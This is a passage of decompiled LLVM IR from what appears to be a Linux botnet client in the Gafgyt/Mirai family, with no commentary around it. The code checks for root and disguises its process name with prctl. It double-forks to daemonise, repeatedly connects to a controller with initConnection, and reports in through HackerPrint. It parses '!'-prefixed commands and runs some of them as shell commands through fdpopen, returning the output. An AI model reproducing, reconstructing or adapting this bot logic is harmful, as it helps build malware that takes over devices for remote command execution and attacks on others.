  %. = select i1 %v4_1000cb24, i32 ptrtoint ([7 x i8]* @global_var_1001ab8c.1002 to i32), i32 ptrtoint ([7 x i8]* @global_var_1001ab84.1001 to i32)
  ret i32 %.
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5252 = alloca i8*, align 4
  %stack_var_-5212 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-5320 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 268487592, i32* @lr, align 4
  %v4_1000cba4 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_1001ab74.1000 to i32), i32 0, i32 268566528)
  %v4_1000cbb0 = icmp eq i32 %v4_1000cba4, -1
  %. = select i1 %v4_1000cbb0, i32 ptrtoint ([19 x i8]* @global_var_1001aba0.1005 to i32), i32 ptrtoint ([5 x i8]* @global_var_1001ab98.1004 to i32)
  store i32 268487640, i32* @lr, align 4
  %v0_1000cbd4 = call i32 @geteuid()
  %v3_1000cbdc = icmp eq i32 %v0_1000cbd4, 0
  br i1 %v3_1000cbdc, label %dec_label_pc_1000cbe4, label %dec_label_pc_1000cbf0

dec_label_pc_1000cbe4:                            ; preds = %entry
  store i32 0, i32* @global_var_1002c89c.1006, align 4
  br label %dec_label_pc_1000cbf0

dec_label_pc_1000cbf0:                            ; preds = %entry, %dec_label_pc_1000cbe4
  store i32 268487668, i32* @lr, align 4
  %v0_1000cbf0 = call i32 @getBuild()
  store i32 268487680, i32* @lr, align 4
  %v0_1000cbfc = call i32 @getBuild()
  %v3_1000cc08 = load i32, i32* @global_var_1002c908.248, align 4
  store i32 %v3_1000cc08, i32* %stack_var_-80, align 4
  store i32 268487708, i32* @lr, align 4
  %v3_1000cc18 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000cc28 = load i32, i32* @r29, align 4
  %v1_1000cc28 = inttoptr i32 %v0_1000cc28 to i8*
  %v1_1000cc2c = inttoptr i32 %v3_1000cc18 to i8*
  %v9_1000cc34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001abb4.1007, i32 0, i32 0), i8* %v1_1000cc28, i8* %v1_1000cc2c)
  %v1_1000cc3c = bitcast i8** %argv to i32*
  %v2_1000cc3c = load i32, i32* %v1_1000cc3c, align 4
  store i32 %v2_1000cc3c, i32* @r3, align 4
  %v0_1000cc50 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_1001ab94.1003 to i32), i32* @r4, align 4
  store i32 268487788, i32* @lr, align 4
  %v3_1000cc68 = call i32 @strncpy(i32 %v2_1000cc3c, i32 ptrtoint (i32* @global_var_1001ab94.1003 to i32), i32 %v0_1000cc50)
  %v3_1000cc70 = load i32, i32* %v1_1000cc3c, align 4
  store i32 %v3_1000cc70, i32* @r3, align 4
  store i32 268487812, i32* @lr, align 4
  %v4_1000cc80 = load i32, i32* @r6, align 4
  %v5_1000cc80 = call i32 @sprintf(i32 %v3_1000cc70, i32 %., i32 %tmp, i32 %v4_1000cc80)
  store i32 ptrtoint ([3 x i8]* @global_var_1000cca4.1008 to i32), i32* @lr, align 4
  %v5_1000cca0 = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  store i32 268487852, i32* @lr, align 4
  %v1_1000cca8 = call i32 @__GI_time(i32 0)
  store i32 268487860, i32* @lr, align 4
  %v0_1000ccb0 = call i32 @__libc_getpid()
  %v2_1000ccb8 = xor i32 %v1_1000cca8, %v0_1000ccb0
  store i32 ptrtoint ([3 x i8]* @global_var_1000ccc4.1009 to i32), i32* @lr, align 4
  %v1_1000ccc0 = call i32 @srand(i32 %v2_1000ccb8)
  store i32 268487884, i32* @lr, align 4
  %v1_1000ccc8 = call i32 @__GI_time(i32 0)
  store i32 268487892, i32* @lr, align 4
  %v0_1000ccd0 = call i32 @__libc_getpid()
  %v2_1000ccd8 = xor i32 %v1_1000ccc8, %v0_1000ccd0
  %v1_1000cce0 = call i32 @init_rand(i32 %v2_1000ccd8)
  store i32 ptrtoint (i32* @global_var_1000cce8.1010 to i32), i32* @lr, align 4
  %v1_1000cce4 = call i32 @getOurIP(i32 %v1_1000cce0)
  store i32 268487916, i32* @lr, align 4
  %v0_1000cce8 = call i32 @__libc_fork()
  %v3_1000ccf8 = icmp eq i32 %v0_1000cce8, 0
  br i1 %v3_1000ccf8, label %dec_label_pc_1000cd28, label %dec_label_pc_1000cd1c

dec_label_pc_1000cd1c:                            ; preds = %dec_label_pc_1000cbf0
  %v2_1000cd00 = ptrtoint i32* %stack_var_-5256 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000cd14.1011 to i32), i32* @lr, align 4
  %v3_1000cd10 = call i32 @__libc_waitpid(i32 %v0_1000cce8, i32 %v2_1000cd00, i32 0)
  %v0_1000cd18 = call i32 @__GI_exit()
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cbf0
  store i32 268487980, i32* @lr, align 4
  %v0_1000cd28 = call i32 @__libc_fork()
  %v3_1000cd38 = icmp eq i32 %v0_1000cd28, 0
  br i1 %v3_1000cd38, label %dec_label_pc_1000cd48, label %dec_label_pc_1000cd40

dec_label_pc_1000cd40:                            ; preds = %dec_label_pc_1000cd28
  %v0_1000cd44 = call i32 @__GI_exit()
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd48:                            ; preds = %dec_label_pc_1000cd1c, %dec_label_pc_1000cd28, %dec_label_pc_1000cd40
  store i32 268488012, i32* @lr, align 4
  %v0_1000cd48 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_1000cd58.1014 to i32), i32* @lr, align 4
  %v2_1000cd54 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1001abc4.1013 to i32), i32 268566528)
  store i32 ptrtoint (i32* @global_var_1000cd64.1015 to i32), i32* @lr, align 4
  %v2_1000cd60 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000d598 = ptrtoint i32* %stack_var_-4188 to i32
  %v4_1000d5a8 = bitcast i32* %stack_var_-4188 to i8*
  %v2_1000d0bc = ptrtoint i32* %stack_var_-5320 to i32
  %v1_1000d1cc = or i32 %v2_1000d598, 1
  %v2_1000d354 = ptrtoint i32* %stack_var_-5212 to i32
  %v2_1000d530 = bitcast i8** %stack_var_-5252 to i32*
  %v2_1000d560 = add i32 %v2_1000d0bc, 68
  br label %dec_label_pc_1000cd68

dec_label_pc_1000cd68:                            ; preds = %dec_label_pc_1000cd78, %dec_label_pc_1000d590, %dec_label_pc_1000cd48
  %v0_1000cd68 = call i32 @initConnection()
  %v3_1000cd70 = icmp eq i32 %v0_1000cd68, 0
  br i1 %v3_1000cd70, label %dec_label_pc_1000cd84, label %dec_label_pc_1000cd78

dec_label_pc_1000cd78:                            ; preds = %dec_label_pc_1000cd68
  store i32 268488064, i32* @lr, align 4
  %v1_1000cd7c = call i32 @sleep(i32 5)
  br label %dec_label_pc_1000cd68

dec_label_pc_1000cd84:                            ; preds = %dec_label_pc_1000cd68
  %v3_1000cd90 = load i32, i32* @global_var_1002c908.248, align 4
  store i32 %v3_1000cd90, i32* %stack_var_-80, align 4
  store i32 268488100, i32* @lr, align 4
  %v3_1000cda0 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 268488108, i32* @lr, align 4
  %v0_1000cda8 = call i32 @getBuild()
  %v0_1000cdb0 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000cdd4.1018 to i32), i32* @lr, align 4
  %v6_1000cdd0 = call i32 @HackerPrint(i32 %v0_1000cdb0, i32 ptrtoint (i32* @global_var_1001abc8.1016 to i32), i32 %v3_1000cda0)
  br label %dec_label_pc_1000d590

dec_label_pc_1000cdf4:                            ; preds = %dec_label_pc_1000d0a8, %dec_label_pc_1000d04c
  %v1_1000cdf8 = mul i32 %storemerge15, 4
  %v3_1000ce04 = load i32, i32* @global_var_1002c914.40, align 4
  %v2_1000ce08 = add i32 %v3_1000ce04, %v1_1000cdf8
  %v1_1000ce0c = inttoptr i32 %v2_1000ce08 to i32*
  %v2_1000ce0c = load i32, i32* %v1_1000ce0c, align 4
  store i32 268488224, i32* @lr, align 4
  %v3_1000ce1c = call i32 @__libc_waitpid(i32 %v2_1000ce0c, i32 0, i32 1)
  %tmp94 = icmp slt i32 %v3_1000ce1c, 1
  br i1 %tmp94, label %dec_label_pc_1000d040, label %dec_label_pc_1000ce84

dec_label_pc_1000ce3c:                            ; preds = %dec_label_pc_1000ce84, %dec_label_pc_1000cecc
  %v1_1000ce40 = mul i32 %v1_1000ce30, 4
  %v3_1000ce4c = load i32, i32* @global_var_1002c914.40, align 4
  %v2_1000ce50 = add i32 %v3_1000ce4c, %v1_1000ce40
  %v1_1000ce54 = add i32 %v2_1000ce50, -4
  %v1_1000ce70 = inttoptr i32 %v2_1000ce50 to i32*
  %v2_1000ce70 = load i32, i32* %v1_1000ce70, align 4
  %v2_1000ce74 = inttoptr i32 %v1_1000ce54 to i32*
  store i32 %v2_1000ce70, i32* %v2_1000ce74, align 4
  br label %dec_label_pc_1000ce84

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000cdf4, %dec_label_pc_1000ce3c
  %storemerge20 = phi i32 [ %v1_1000ce30, %dec_label_pc_1000ce3c ], [ %storemerge15, %dec_label_pc_1000cdf4 ]
  %v1_1000ce30 = add i32 %storemerge20, 1
  %v2_1000ceac = load i32, i32* @global_var_1002c8e8.38, align 4
  %v3_1000cec4 = icmp eq i32 %v2_1000ceac, 0
  br i1 %v3_1000cec4, label %dec_label_pc_1000cecc, label %dec_label_pc_1000ce3c

dec_label_pc_1000cecc:                            ; preds = %dec_label_pc_1000ce84
  %v3_1000ceb0 = load i32, i32* @global_var_1002c8ec.39, align 4
  %v3_1000cee4 = icmp ugt i32 %v3_1000ceb0, %v1_1000ce30
  br i1 %v3_1000cee4, label %dec_label_pc_1000ce3c, label %dec_label_pc_1000ceec

dec_label_pc_1000ceec:                            ; preds = %dec_label_pc_1000cecc
  %v1_1000cef0 = mul i32 %v1_1000ce30, 4
  %v3_1000cefc = load i32, i32* @global_var_1002c914.40, align 4
  %v2_1000cf00 = add i32 %v1_1000cef0, -4
  %v1_1000cf04 = add i32 %v2_1000cf00, %v3_1000cefc
  %v2_1000cf0c = inttoptr i32 %v1_1000cf04 to i32*
  store i32 0, i32* %v2_1000cf0c, align 4
  %v3_1000cf18 = load i32, i32* @global_var_1002c8ec.39, align 4
  %v2_1000cf1c = load i32, i32* @global_var_1002c8e8.38, align 4
  %v1_1000cf20 = add i32 %v3_1000cf18, -1
  %v2_1000cf20 = icmp ne i32 %v3_1000cf18, 0
  %v2_1000cf24 = zext i1 %v2_1000cf20 to i32
  %v3_1000cf24 = add i32 %v2_1000cf1c, -1
  %v4_1000cf24 = add i32 %v3_1000cf24, %v2_1000cf24
  store i32 %v4_1000cf24, i32* @global_var_1002c8e8.38, align 4
  store i32 %v1_1000cf20, i32* @global_var_1002c8ec.39, align 4
  %v1_1000cf54 = mul i32 %v1_1000cf20, 4
  %v1_1000cf5c = add i32 %v1_1000cf54, 4
  store i32 268488552, i32* @lr, align 4
  %v1_1000cf64 = call i32 @malloc(i32 %v1_1000cf5c)
  br label %dec_label_pc_1000cfbc

dec_label_pc_1000cf7c:                            ; preds = %dec_label_pc_1000cfbc, %dec_label_pc_1000d004
  %v1_1000cf80 = mul i32 %storemerge19, 4
  %v2_1000cf8c = add i32 %v1_1000cf80, %v1_1000cf64
  %v3_1000cfa0 = load i32, i32* @global_var_1002c914.40, align 4
  %v2_1000cfa4 = add i32 %v3_1000cfa0, %v1_1000cf80
  %v1_1000cfa8 = inttoptr i32 %v2_1000cfa4 to i32*
  %v2_1000cfa8 = load i32, i32* %v1_1000cfa8, align 4
  %v2_1000cfac = inttoptr i32 %v2_1000cf8c to i32*
  store i32 %v2_1000cfa8, i32* %v2_1000cfac, align 4
  %v1_1000cfb4 = add i32 %storemerge19, 1
  br label %dec_label_pc_1000cfbc

dec_label_pc_1000cfbc:                            ; preds = %dec_label_pc_1000ceec, %dec_label_pc_1000cf7c
  %storemerge19 = phi i32 [ 0, %dec_label_pc_1000ceec ], [ %v1_1000cfb4, %dec_label_pc_1000cf7c ]
  %v2_1000cfe4 = load i32, i32* @global_var_1002c8e8.38, align 4
  %v3_1000cffc = icmp eq i32 %v2_1000cfe4, 0
  br i1 %v3_1000cffc, label %dec_label_pc_1000d004, label %dec_label_pc_1000cf7c

dec_label_pc_1000d004:                            ; preds = %dec_label_pc_1000cfbc
  %v3_1000cfe8 = load i32, i32* @global_var_1002c8ec.39, align 4
  %v3_1000d01c = icmp ugt i32 %v3_1000cfe8, %storemerge19
  br i1 %v3_1000d01c, label %dec_label_pc_1000cf7c, label %dec_label_pc_1000d024

dec_label_pc_1000d024:                            ; preds = %dec_label_pc_1000d004
  %v3_1000d028 = load i32, i32* @global_var_1002c914.40, align 4
  store i32 268488756, i32* @lr, align 4
  %v1_1000d030 = call i32 @free(i32 %v3_1000d028)
  store i32 %v1_1000cf64, i32* @global_var_1002c914.40, align 4
  br label %dec_label_pc_1000d040

dec_label_pc_1000d040:                            ; preds = %dec_label_pc_1000cdf4, %dec_label_pc_1000d024
  %v1_1000d044 = add i32 %storemerge15, 1
  br label %dec_label_pc_1000d04c

dec_label_pc_1000d04c:                            ; preds = %dec_label_pc_1000d590, %dec_label_pc_1000d040
  %storemerge15 = phi i32 [ %v1_1000d044, %dec_label_pc_1000d040 ], [ 0, %dec_label_pc_1000d590 ]
  %tmp96 = icmp slt i32 %storemerge15, 0
  %v1_1000d050 = zext i1 %tmp96 to i32
  %v2_1000d050 = ashr i32 %storemerge15, 31
  %v3_1000d050 = and i32 %v2_1000d050, -2
  %v4_1000d050 = or i32 %v3_1000d050, %v1_1000d050
  %v2_1000d078 = load i32, i32* @global_var_1002c8e8.38, align 4
  %v3_1000d07c = load i32, i32* @global_var_1002c8ec.39, align 4
  %v3_1000d090 = icmp ugt i32 %v2_1000d078, %v4_1000d050
  br i1 %v3_1000d090, label %dec_label_pc_1000cdf4, label %dec_label_pc_1000d098

dec_label_pc_1000d098:                            ; preds = %dec_label_pc_1000d04c
  %v4_1000d090 = icmp eq i32 %v2_1000d078, %v4_1000d050
  br i1 %v4_1000d090, label %dec_label_pc_1000d0a8, label %dec_label_pc_1000d0b8

dec_label_pc_1000d0a8:                            ; preds = %dec_label_pc_1000d098
  %v3_1000d0b0 = icmp ugt i32 %v3_1000d07c, %storemerge15
  br i1 %v3_1000d0b0, label %dec_label_pc_1000cdf4, label %dec_label_pc_1000d0b8

dec_label_pc_1000d0b8:                            ; preds = %dec_label_pc_1000d098, %dec_label_pc_1000d0a8
  %v2_1000d0c0 = add i32 %v5_1000d5a8, %v2_1000d0bc
  %v3_1000d0c8 = add i32 %v2_1000d0c0, 1132
  %v4_1000d0c8 = inttoptr i32 %v3_1000d0c8 to i8*
  store i8 0, i8* %v4_1000d0c8, align 1
  %v1_1000d0d4 = call i32 @trim(i32 %v2_1000d598)
  store i32 268488940, i32* @lr, align 4
  %v5_1000d0e8 = call i32 @strstr(i32 %v2_1000d598, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10016518.31, i32 0, i32 0), i32 268500992)
  %v4_1000d0f4 = icmp eq i32 %v5_1000d0e8, %v2_1000d598
  br i1 %v4_1000d0f4, label %dec_label_pc_1000d0fc, label %dec_label_pc_1000d11c

dec_label_pc_1000d0fc:                            ; preds = %dec_label_pc_1000d0b8
  %v3_1000d100 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_1000d118.1020 to i32), i32* @lr, align 4
  %v4_1000d114 = call i32 @HackerPrint(i32 %v3_1000d100, i32 ptrtoint ([5 x i8]* @global_var_1001ac50.1019 to i32), i32 268566528)
  br label %dec_label_pc_1000d590

dec_label_pc_1000d11c:                            ; preds = %dec_label_pc_1000d0b8
  store i32 268489008, i32* @lr, align 4
  %v5_1000d12c = call i32 @strstr(i32 %v2_1000d598, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001ac58.1021, i32 0, i32 0), i32 268566528)
  %v4_1000d138 = icmp eq i32 %v5_1000d12c, %v2_1000d598
  br i1 %v4_1000d138, label %dec_label_pc_1000d140, label %dec_label_pc_1000d148

dec_label_pc_1000d140:                            ; preds = %dec_label_pc_1000d11c
  %v0_1000d144 = call i32 @__GI_exit()
  br label %dec_label_pc_1000d148

dec_label_pc_1000d148:                            ; preds = %dec_label_pc_1000d11c, %dec_label_pc_1000d140
  %v2_1000d154 = load i8, i8* %v4_1000d5a8, align 4
  %v3_1000d15c = icmp eq i8 %v2_1000d154, 33
  br i1 %v3_1000d15c, label %dec_label_pc_1000d180, label %dec_label_pc_1000d590

dec_label_pc_1000d180:                            ; preds = %dec_label_pc_1000d148, %dec_label_pc_1000d194
  %storemerge = phi i32 [ %v1_1000d168, %dec_label_pc_1000d194 ], [ %v2_1000d598, %dec_label_pc_1000d148 ]
  %v1_1000d168 = add i32 %storemerge, 1
  %storemerge9 = inttoptr i32 %v1_1000d168 to i8*
  %v2_1000d184 = load i8, i8* %storemerge9, align 1
  %v3_1000d18c = icmp eq i8 %v2_1000d184, 32
  br i1 %v3_1000d18c, label %dec_label_pc_1000d1a8, label %dec_label_pc_1000d194

dec_label_pc_1000d194:                            ; preds = %dec_label_pc_1000d180
  %v2_1000d198 = load i8, i8* %storemerge9, align 1
  %v3_1000d1a0 = icmp eq i8 %v2_1000d198, 0
  br i1 %v3_1000d1a0, label %dec_label_pc_1000d1a8, label %dec_label_pc_1000d180

dec_label_pc_1000d1a8:                            ; preds = %dec_label_pc_1000d194, %dec_label_pc_1000d180
  %v2_1000d1ac = load i8, i8* %storemerge9, align 1
  %v3_1000d1b4 = icmp eq i8 %v2_1000d1ac, 0
  br i1 %v3_1000d1b4, label %dec_label_pc_1000d590, label %dec_label_pc_1000d1bc

dec_label_pc_1000d1bc:                            ; preds = %dec_label_pc_1000d1a8
  store i8 0, i8* %storemerge9, align 1
  store i32 %v1_1000d1cc, i32* @r3, align 4
  %v0_1000d1dc = call i32 @__GI_strlen()
  %v2_1000d1ec = add i32 %v0_1000d1dc, %v2_1000d598
  %v1_1000d1f0 = add i32 %v2_1000d1ec, 2
  %v2_1000d23c = add i32 %v2_1000d1ec, 1
  br label %dec_label_pc_1000d224

dec_label_pc_1000d1fc:                            ; preds = %dec_label_pc_1000d254, %dec_label_pc_1000d224
  store i32 %v1_1000d1f0, i32* @r3, align 4
  %v0_1000d204 = call i32 @__GI_strlen()
  %v1_1000d218 = add i32 %v0_1000d204, %v2_1000d23c
  %v3_1000d220 = inttoptr i32 %v1_1000d218 to i8*
  store i8 0, i8* %v3_1000d220, align 1
  br label %dec_label_pc_1000d224

dec_label_pc_1000d224:                            ; preds = %dec_label_pc_1000d1bc, %dec_label_pc_1000d1fc
  store i32 %v1_1000d1f0, i32* @r3, align 4
  %v0_1000d22c = call i32 @__GI_strlen()
  %v1_1000d240 = add i32 %v0_1000d22c, %v2_1000d23c
  %v1_1000d244 = inttoptr i32 %v1_1000d240 to i8*
  %v2_1000d244 = load i8, i8* %v1_1000d244, align 1
  %v3_1000d24c = icmp eq i8 %v2_1000d244, 10
  br i1 %v3_1000d24c, label %dec_label_pc_1000d1fc, label %dec_label_pc_1000d254

dec_label_pc_1000d254:                            ; preds = %dec_label_pc_1000d224
  store i32 %v1_1000d1f0, i32* @r3, align 4
  %v0_1000d25c = call i32 @__GI_strlen()
  %v1_1000d270 = add i32 %v0_1000d25c, %v2_1000d23c
  %v1_1000d274 = inttoptr i32 %v1_1000d270 to i8*
  %v2_1000d274 = load i8, i8* %v1_1000d274, align 1
  %v3_1000d27c = icmp eq i8 %v2_1000d274, 13
  br i1 %v3_1000d27c, label %dec_label_pc_1000d1fc, label %dec_label_pc_1000d284

dec_label_pc_1000d284:                            ; preds = %dec_label_pc_1000d254
  %v5_1000d1f4 = inttoptr i32 %v1_1000d1f0 to i8*
  %v2_1000d2a022 = load i8, i8* %v5_1000d1f4, align 1
  %v3_1000d2a826 = icmp eq i8 %v2_1000d2a022, 32
  br i1 %v3_1000d2a826, label %dec_label_pc_1000d2c4, label %dec_label_pc_1000d2b0

dec_label_pc_1000d290:                            ; preds = %dec_label_pc_1000d2b0
  %v1_1000d294 = add i32 %v4_1000d29c28, 1
  %v5_1000d298 = inttoptr i32 %v1_1000d294 to i8*
  %v2_1000d2a0 = load i8, i8* %v5_1000d298, align 1
  %v3_1000d2a8 = icmp eq i8 %v2_1000d2a0, 32
  br i1 %v3_1000d2a8, label %dec_label_pc_1000d2c4, label %dec_label_pc_1000d2b0

dec_label_pc_1000d2b0:                            ; preds = %dec_label_pc_1000d284, %dec_label_pc_1000d290
  %v4_1000d29c28 = phi i32 [ %v1_1000d294, %dec_label_pc_1000d290 ], [ %v1_1000d1f0, %dec_label_pc_1000d284 ]
  %stack_var_-5284.027 = phi i8* [ %v5_1000d298, %dec_label_pc_1000d290 ], [ %v5_1000d1f4, %dec_label_pc_1000d284 ]
  %v2_1000d2b4 = load i8, i8* %stack_var_-5284.027, align 1
  %v3_1000d2bc = icmp eq i8 %v2_1000d2b4, 0
  br i1 %v3_1000d2bc, label %dec_label_pc_1000d2c4, label %dec_label_pc_1000d290

dec_label_pc_1000d2c4:                            ; preds = %dec_label_pc_1000d290, %dec_label_pc_1000d2b0, %dec_label_pc_1000d284
  %stack_var_-5284.0.lcssa = phi i8* [ %v5_1000d1f4, %dec_label_pc_1000d284 ], [ %v5_1000d298, %dec_label_pc_1000d290 ], [ %stack_var_-5284.027, %dec_label_pc_1000d2b0 ]
  %v4_1000d29c.lcssa = phi i32 [ %v1_1000d1f0, %dec_label_pc_1000d284 ], [ %v1_1000d294, %dec_label_pc_1000d290 ], [ %v4_1000d29c28, %dec_label_pc_1000d2b0 ]
  store i8 0, i8* %stack_var_-5284.0.lcssa, align 1
  %v1_1000d2d4 = add i32 %v4_1000d29c.lcssa, 1
  %v2_1000d32033 = load i8, i8* %v5_1000d1f4, align 1
  %v3_1000d32836 = icmp eq i8 %v2_1000d32033, 0
  br i1 %v3_1000d32836, label %dec_label_pc_1000d330, label %dec_label_pc_1000d2e8

dec_label_pc_1000d2e8:                            ; preds = %dec_label_pc_1000d2c4, %dec_label_pc_1000d2e8
  %v4_1000d31c38 = phi i32 [ %v1_1000d314, %dec_label_pc_1000d2e8 ], [ %v1_1000d1f0, %dec_label_pc_1000d2c4 ]
  %storemerge837 = phi i8* [ %v5_1000d318, %dec_label_pc_1000d2e8 ], [ %v5_1000d1f4, %dec_label_pc_1000d2c4 ]
  %v3_1000d2ec = load i8, i8* %storemerge837, align 1
  %v4_1000d2ec = zext i8 %v3_1000d2ec to i32
  store i32 268489472, i32* @lr, align 4
  %v3_1000d2fc = call i32 @__GI_toupper(i32 %v4_1000d2ec, i32 %v4_1000d31c38)
  %v1_1000d30c = trunc i32 %v3_1000d2fc to i8
  store i8 %v1_1000d30c, i8* %storemerge837, align 1
  %v1_1000d314 = add i32 %v4_1000d31c38, 1
  %v5_1000d318 = inttoptr i32 %v1_1000d314 to i8*
  %v2_1000d320 = load i8, i8* %v5_1000d318, align 1
  %v3_1000d328 = icmp eq i8 %v2_1000d320, 0
  br i1 %v3_1000d328, label %dec_label_pc_1000d330, label %dec_label_pc_1000d2e8

dec_label_pc_1000d330:                            ; preds = %dec_label_pc_1000d2e8, %dec_label_pc_1000d2c4
  %v2_1000d334 = load i8, i8* %v5_1000d1f4, align 1
  %v3_1000d33c = icmp eq i8 %v2_1000d334, 0
  br i1 %v3_1000d33c, label %dec_label_pc_1000d344, label %dec_label_pc_1000d40c

dec_label_pc_1000d344:                            ; preds = %dec_label_pc_1000d330
  store i32 268489544, i32* @lr, align 4
  %v0_1000d344 = call i32 @listFork()
  %v3_1000d34c = icmp eq i32 %v0_1000d344, 0
  br i1 %v3_1000d34c, label %dec_label_pc_1000d354, label %dec_label_pc_1000d590

dec_label_pc_1000d354:                            ; preds = %dec_label_pc_1000d344
  store i32 268489580, i32* @lr, align 4
  %v3_1000d368 = call i32 @__GI_memset(i32 %v2_1000d354, i32 0, i32 1024)
  %v4_1000d388 = call i32 @szprintf(i32 %v2_1000d354, i32 ptrtoint ([8 x i8]* @global_var_1001ac5c.1022 to i32), i32 %v1_1000d2d4)
  store i32 268489636, i32* @lr, align 4
  %v3_1000d3a0 = call i32 @fdpopen(i32 %v2_1000d354, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1001ac64.1023, i32 0, i32 0))
  br label %dec_label_pc_1000d3dc

dec_label_pc_1000d3b0:                            ; preds = %dec_label_pc_1000d3dc
  %v1_1000d3b8 = call i32 @trim(i32 %v2_1000d354)
  store i32 ptrtoint ([3 x i8]* @global_var_1000d3d4.1024 to i32), i32* @lr, align 4
  %v3_1000d3d0 = call i32 @__GI_memset(i32 %v2_1000d354, i32 0, i32 1024)
  store i32 268489692, i32* @lr, align 4
  %v1_1000d3d8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1000d3dc

dec_label_pc_1000d3dc:                            ; preds = %dec_label_pc_1000d354, %dec_label_pc_1000d3b0
  %v3_1000d3ec = call i32 @fdgets(i32 %v2_1000d354, i32 1024, i32 %v3_1000d3a0)
  %v3_1000d3f4 = icmp eq i32 %v3_1000d3ec, 0
  br i1 %v3_1000d3f4, label %dec_label_pc_1000d3fc, label %dec_label_pc_1000d3b0

dec_label_pc_1000d3fc:                            ; preds = %dec_label_pc_1000d3dc
  %v1_1000d400 = call i32 @fdpclose(i32 %v3_1000d3a0)
  %v0_1000d408 = call i32 @__GI_exit()
  br label %dec_label_pc_1000d40c

dec_label_pc_1000d40c:                            ; preds = %dec_label_pc_1000d330, %dec_label_pc_1000d3fc
  store i32 ptrtoint (i32* @global_var_1001ac68.1027 to i32), i32* @r4, align 4
  store i32 268489768, i32* @lr, align 4
  %v3_1000d424 = call i32 @__GI_strtok(i32 %v1_1000d2d4, i32 ptrtoint (i32* @global_var_1001ac68.1027 to i32), i32 268566528)
  store i8* %v5_1000d1f4, i8** %stack_var_-5252, align 4
  %v3_1000d51c42 = icmp eq i32 %v3_1000d424, 0
  br i1 %v3_1000d51c42, label %dec_label_pc_1000d524, label %dec_label_pc_1000d43c

dec_label_pc_1000d43c:                            ; preds = %dec_label_pc_1000d40c, %dec_label_pc_1000d500
  %stack_var_-5312.045.in = phi i32 [ %v3_1000d50c, %dec_label_pc_1000d500 ], [ %v3_1000d424, %dec_label_pc_1000d40c ]
  %stack_var_-5308.143 = phi i32 [ %stack_var_-5308.0, %dec_label_pc_1000d500 ], [ 1, %dec_label_pc_1000d40c ]
  %stack_var_-5312.045 = inttoptr i32 %stack_var_-5312.045.in to i8*
  %v2_1000d440 = load i8, i8* %stack_var_-5312.045, align 1
  %v3_1000d448 = icmp eq i8 %v2_1000d440, 10
  br i1 %v3_1000d448, label %dec_label_pc_1000d500, label %dec_label_pc_1000d450

dec_label_pc_1000d450:                            ; preds = %dec_label_pc_1000d43c
  store i32 %stack_var_-5308.143, i32* @r29, align 4
  store i32 %stack_var_-5312.045.in, i32* @r3, align 4
  %v0_1000d45c = call i32 @__GI_strlen()
  %v1_1000d464 = add i32 %v0_1000d45c, 1
  store i32 268489840, i32* @lr, align 4
  %v1_1000d46c = call i32 @malloc(i32 %v1_1000d464)
  %v0_1000d478 = load i32, i32* @r29, align 4
  %v1_1000d478 = mul i32 %v0_1000d478, 4
  %v1_1000d484 = add i32 %v1_1000d478, %v2_1000d560
  %v2_1000d488 = inttoptr i32 %v1_1000d484 to i32*
  store i32 %v1_1000d46c, i32* %v2_1000d488, align 4
  %v1_1000d490 = mul i32 %stack_var_-5308.143, 4
  %v1_1000d49c = add i32 %v1_1000d490, %v2_1000d560
  %v1_1000d4a0 = inttoptr i32 %v1_1000d49c to i32*
  %v2_1000d4a0 = load i32, i32* %v1_1000d4a0, align 4
  store i32 %stack_var_-5312.045.in, i32* @r3, align 4
  %v0_1000d4ac = call i32 @__GI_strlen()
  %v1_1000d4b4 = add i32 %v0_1000d4ac, 1
  store i32 268489932, i32* @lr, align 4
  %v3_1000d4c8 = call i32 @__GI_memset(i32 %v2_1000d4a0, i32 0, i32 %v1_1000d4b4)
  %v2_1000d4e0 = load i32, i32* %v1_1000d4a0, align 4
  %v4_1000d4f0 = call i32 @strcpy(i32 %v2_1000d4e0, i8* nonnull %stack_var_-5312.045)
  %v1_1000d4f8 = add i32 %stack_var_-5308.143, 1
  br label %dec_label_pc_1000d500

dec_label_pc_1000d500:                            ; preds = %dec_label_pc_1000d43c, %dec_label_pc_1000d450
  %stack_var_-5308.0 = phi i32 [ %stack_var_-5308.143, %dec_label_pc_1000d43c ], [ %v1_1000d4f8, %dec_label_pc_1000d450 ]
  store i32 ptrtoint (i32* @global_var_1001ac68.1027 to i32), i32* @r4, align 4
  store i32 268490000, i32* @lr, align 4
  %v3_1000d50c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001ac68.1027 to i32), i32 268566528)
  %v3_1000d51c = icmp eq i32 %v3_1000d50c, 0
  br i1 %v3_1000d51c, label %dec_label_pc_1000d524, label %dec_label_pc_1000d43c

dec_label_pc_1000d524:                            ; preds = %dec_label_pc_1000d500, %dec_label_pc_1000d40c
